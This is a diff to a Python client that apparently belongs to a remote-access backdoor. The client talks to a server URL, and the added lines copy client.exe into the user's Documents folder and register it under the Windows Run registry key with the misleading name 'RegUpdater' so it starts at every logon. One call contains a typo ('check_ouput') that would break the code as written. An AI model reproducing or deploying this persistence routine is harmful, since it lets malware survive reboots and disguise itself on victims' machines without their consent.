@@ -1,11 +1,21 @@
 import os
 import shutil
-from subprocess import PIPE, Popen
+from subprocess import PIPE, Popen, check_output
 import requests
 import time
 import random
+import _winreg as wreg
 
 SERVER_URL = 'http://127.0.0.1'
+
+path = os.getcwd().strip('\n')
+Null,userprof = check_ouput('set USERPROFILE', shell=True).split('=')
+destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
+if not os.path.exists(destination):
+    shutil.copyfile(path + '\client.exe', destination)
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
+    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
+    key.Close()
 
 def connect():
     while True:
